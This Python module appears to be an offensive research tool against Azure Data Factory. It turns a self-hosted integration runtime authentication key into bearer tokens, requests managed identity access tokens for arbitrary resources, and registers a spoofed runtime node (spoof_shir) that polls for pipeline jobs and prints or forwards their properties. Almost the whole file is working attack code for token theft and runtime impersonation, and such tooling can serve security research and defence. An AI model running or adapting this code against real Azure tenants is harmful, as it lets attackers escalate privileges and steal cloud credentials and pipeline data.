"""Module containing the DataFactoryClient class"""
import uuid
import logging
import requests
import base64
import json
from time import sleep

class TooManyIRNodesException(Exception):
    pass

class DataFactoryClient:
    """
        An HTTP Client for the Internal DataFactory API
    """

    def __init__( self, authentication_key, ir_node_id=None, spoofed_ir_name="Default" ):
        self.key=authentication_key
        self.dataFactory_hostname=None
        self.dataFactory_url=None
        self.user_key_encoded=None
        self.ir_instance_id=None
        self.dataFactory_name=None
        self.datafactory_token=None
        self.subscription_id=None
        self.data_factory_id=None
        self.current_bearer_token=None
        self.ir_node_id=ir_node_id
        self.spoofed_ir_name=spoofed_ir_name

        # Parse the key and construct the Base64 encoded token that will be used later
        (_, self.ir_instance_id, self.dataFactory_name, service_endpoint, ir_key)=self.key.split("@")
        self.dataFactory_hostname=service_endpoint.split("=")[1]
        self.dataFactory_url= f"https://{self.dataFactory_hostname}"
        user_key_unencoded=f"ams#{self.dataFactory_name}#{self.ir_instance_id}#{ir_key}".encode()
        self.user_key_encoded=base64.urlsafe_b64encode(user_key_unencoded).decode()

        self._get_and_parse_df_bearer()
    
    def _get_and_parse_df_bearer(self):
        bearer_token=self.get_dataFactory_token()
        self.current_bearer_token=bearer_token

        # Decode the token and extract the Azure subscription ID of the Data Factory
        decoded_df_token = base64.b64decode(bearer_token)
        df_token_dict = json.loads(decoded_df_token)
        df_token_content=json.loads(df_token_dict["ContentString"])
        declarations_dict = json.loads(df_token_content["Policy"]["Declarations"][0]["Value"])
        self.subscription_id=declarations_dict["PartitionId"]
        self.data_factory_id=declarations_dict["ExtendedProperties"]["DataFactoryId"]
        
    def get_dataFactory_token(self):
        headers = {
            "Authorization": f"UserKey {self.user_key_encoded}",
            "Content-Type": "application/json"
        }

        response = requests.post(self.dataFactory_url + "/subscriptions/00000000-0000-0000-0000-000000000000/authservice/ams/acquiretoken",
                         headers=headers, json=self.user_key_encoded)
        
        data_factory_token = response.json()
        return data_factory_token

    def get_managed_identity_token(self, oauth_resource):
        """
            Get a managed identity token using the DataFactory key
            
            Args:
            - oauth_resource - (string) The oauth resource for the managed identity request.
                                           f.eks https://management.azure.com/, or the client_id
                                           of a service principal

            Returns:
                (string) The access token received
        """
        token=self.get_dataFactory_token()
        headers = {
            "Authorization": f"Bearer {token}"
        }

        body = {
            "resource": oauth_resource,
            "entityName": self.dataFactory_name,
            "executionContextRestricted": True,
            "executionContextVersion": "2024-01-01"
        }

        query_params = {
            "api-version": "2019-09-01"
        }

        request_url = f"https://{self.dataFactory_hostname}/subscriptions/00000000-0000-0000-0000-000000000000/entities/{self.data_factory_id}/identities/00000000-0000-0000-0000-000000000000/token"
        response=requests.post(request_url, headers=headers, params=query_params, json=body)
        token_response=response.json()
        return token_response["accessToken"]

    def spoof_shir(self, poll_interval=3, job_callback=None):
        """
            Register a new self-hosted integration runtime(shir) with the data factory using the
            authentication key. Poll every 3 seconds for jobs. If a job comes in, either print it
            to screen, or process it with the job_callback.

            Args:
            - poll_interval: (int) The frequency to poll for new jobs
            - job_callback: (func) A callback function to execute whenever a new job is observed.
                                   This is useful for custom processing of job responses.

                                   callback arguments: function(<dict>job)
        """
        token=self.get_dataFactory_token()
        auth_headers = {
            "Authorization": f"Bearer {token}",
            "X-Ms-Gateway-Machine-Id": str(uuid.uuid4())
        }
        if self.ir_node_id is None:
            # Register a new Node and get the ID

            body = {
                "gatewayVersion": {
                    "major":5,
                    "minor":48,
                    "build":9076,
                    "revision":1,
                    "majorRevision":0,
                    "minorRevision":1
                },
                "machineName": self.spoofed_ir_name,
                "nodeName":self.spoofed_ir_name
            }

            response = requests.post(f"{self.dataFactory_url}/tenants/{self.subscription_id}/gateways/{self.ir_instance_id}/nodes?api-version=1.0",
                            json=body, headers=auth_headers)
            
            node_response=response.json()
            if "errorCode" in node_response:
                logging.error(f"Error while creating node: {node_response['errorCodeString']}")
                raise TooManyIRNodesException
            self.ir_node_id=node_response["instanceId"]
            logging.info(f"New SHIR Node Registered Data Factory {self.dataFactory_name}: {self.ir_node_id}")
        
        # Establish a new connection
        body = {
            "gatewayVersion": {
                "major":5,
                "minor":48,
                "build":9076,
                "revision":1,
                "majorRevision":0,
                "minorRevision":1
            },
            "machineName": self.spoofed_ir_name
        }

        response = requests.post(f"{self.dataFactory_url}/tenants/{self.subscription_id}/gateways/{self.ir_instance_id}/nodes/{self.ir_node_id}/establishconnection?api-version=1.0",
                                json=body, headers=auth_headers)
        connection_info = response.json()
        public_key=connection_info["publicKey"]

        # Report that we are connected
        body = {
            "serviceBusConnected": None,
            "httpsPortEnabled": True,
            "workerActivated": True
        }

        response = requests.post(f"{self.dataFactory_url}/tenants/{self.subscription_id}/gateways/{self.ir_instance_id}/nodes/{self.ir_node_id}/reportstatus?api-version=1.0",
                         json=body, headers=auth_headers)

        # send initialize request
        body = {
                "gatewayVersion": {
                "major":5,
                "minor":48,
                "build":9076,
                "revision":1,
                "majorRevision":0,
                "minorRevision":1
            },
            "nodeName": self.spoofed_ir_name,
            "publicKey": public_key,
            "coreInitialized":True,

        }

        response = requests.post(f"{self.dataFactory_url}/tenants/{self.subscription_id}/gateways/{self.ir_instance_id}/nodes/{self.ir_node_id}/initialize?api-version=1.0",
                         json=body, headers=auth_headers)
        
        # poll for jobs and print out the contents of the request if it is found, or process it with the callback.
        while True:
            logging.info("Polling for jobs...")
            token = self.get_dataFactory_token()
            auth_headers = {
                "Authorization": f"Bearer {token}"
            }

            query_params = {
                "issecondary": False,
                "queueid": self.ir_instance_id,
                "count": 1,
                "workerid": uuid.uuid4(),
                "api-version": "2014-06-26"
            }

            response = requests.get(f"{self.dataFactory_url}/subscriptions/{self.subscription_id}/we/tasks/next",
                                    headers=auth_headers, params=query_params)
            if response.status_code == 204:
                pass
            else:
                logging.info("Got Job.")
                response_content = response.json()
                for job in response_content:
                    input_data = json.loads(job["InputData"])

                    properties_dict=input_data["Properties"]
                    logging.debug("Job Properties:")
                    logging.debug(properties_dict)
                    if job_callback is None:
                        logging.info("Printing Job Output to stdout...")
                        print(properties_dict)
                    else:
                        logging.info("Using Callback...")
                        job_callback(properties_dict)
            sleep(poll_interval)